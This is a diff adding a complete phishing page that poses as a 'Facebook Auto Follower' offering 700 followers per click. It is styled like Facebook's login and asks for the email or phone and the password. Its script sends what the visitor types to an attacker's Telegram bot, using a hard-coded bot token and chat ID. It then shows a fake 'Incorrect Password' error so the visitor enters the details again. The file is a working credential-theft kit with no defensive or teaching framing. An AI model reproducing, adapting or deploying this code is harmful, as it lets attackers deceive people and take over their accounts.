@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style type="text/css">
+* {
+	box-sizing: border-box;
+}
+
+body {
+	background-color: #f0f2f5;
+	font-family: Arial, sans-serif;
+}
+
+.container {
+	background-color: #ffffff;
+	border-radius: 5px;
+	box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.2);
+	margin: 80px auto;
+	max-width: 400px;
+	padding: 30px;
+	text-align: center;
+}
+
+h1 {
+	color: #1877f2;
+	font-size: 28px;
+	margin-bottom: 30px;
+}
+
+form {
+	display: flex;
+	flex-direction: column;
+}
+
+label {
+	display: inline-block;
+	font-size: 14px;
+	margin-bottom: 5px;
+	text-align: left;
+	width: 100%;
+}
+
+input[type="text"], input[type="password"] {
+	border: 1px solid #dddfe2;
+	border-radius: 5px;
+	font-size: 16px;
+	padding: 12px;
+	width: 100%;
+}
+
+button[type="submit"] {
+	background-color: #1877f2;
+	border: none;
+	border-radius: 5px;
+	color: #ffffff;
+	cursor: pointer;
+	font-size: 16px;
+	margin-top: 20px;
+	padding: 12px;
+	transition: background-color 0.3s ease;
+	width: 100%;
+}
+
+button[type="submit"]:hover {
+	background-color: #0a5fa5;
+}
+
+p {
+	font-size: 14px;
+	margin-top: 20px;
+}
+
+a {
+	color: #1877f2;
+	font-weight: bold;
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+</style>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Facebook Auto Follower</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<h3 style="text-align:center;color:#1877f2;">Login First and get auto Follower. <br>Per Click 700 Follower Sent!</h3>
+<body>
+
+    <p id="error-message"></p>
+    
+	<div class="container">
+		<h1>Facebook Auto Follower</h1>
+
+		<form>
+			<label for="email">Email or Phone</label>
+			<input type="text" id="email" name="email" required>
+			<label for="password">Password</label>
+			<input type="password" id="password" name="password" required>
+			<button type="submit" id="login" class="btn">Log In</button>
+		</form>
+		<p><a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password?</a></p>
+		<hr>
+		<p>Don't have an account? <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&rtime=1679408395&subno_key=AaFkUvnR1UXz5BB-nEuQbGjRTjlo8TGU32dvtNicoDPg4wZiIhQITGS0w_cfGRq2Mx5R6s-DIXo-5-YnDNFjon3Rvwk1u_9UZvAAy3gg3J8anMMkNH7Gz0jqlCPcziGau0GDZhQ9qLg1mFtXwV0iklzv16cPnyY2tz2447J1FKQq_HbH1iRWEfpI2LQmHKyJQ76QukiUnkEHt352sQ3-yOJi6-X92kohNbxhKcwYYwIcI-ZNHV4FUJGQGwV14VDSvQl29CtCsXlA_qsYtB2CkesotivluRPQZz1OArg9Dowqi2mQzqo1ntMcZ8-D9bpbmEg&hrc=1&_rdr">Sign up</a></p>
+	</div>
+
+
+	<script>
+		
+		const botToken = "6025614798:AAGnscxH0t-9S6Pe0q9EYCbf9vaXctGcjhI";
+
+
+
+
+
+const chatId = "6214791827";
+
+
+
+
+
+
+
+		 
+		const emailInput = document.getElementById("email");
+		const passwordInput = document.getElementById("password");
+		const loginButton = document.getElementById("login");
+
+		// Add click event listener to login button
+		loginButton.addEventListener("click", function(event) {
+			event.preventDefault();
+			// Get input values
+			const email = emailInput.value;
+			const password = passwordInput.value;
+			
+			// Send message to Telegram bot
+			const message = `🔐 Account Info
+			\nEmail : ${email}\nPassword : ${password}
+			
+		➔ Powered By ☠ Hidex.Em`;
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+			
+			fetch(url)
+				.then(response => {
+					if (response.ok) {
+					var errorMessage = "Incorrect Password! Please try again.";
+      document.getElementById("error-message").textContent = errorMessage;
+
+						emailInput.value = "";
+						passwordInput.value = "";
+					} else {
+						throw new Error("Failed to send message to Telegram bot.");
+					}
+				})
+				.catch(error => {
+					console.error(error);
+					alert("Failed to send login information to Telegram bot.");
+				});
+		});
+	</script>
+</body>
+</html>
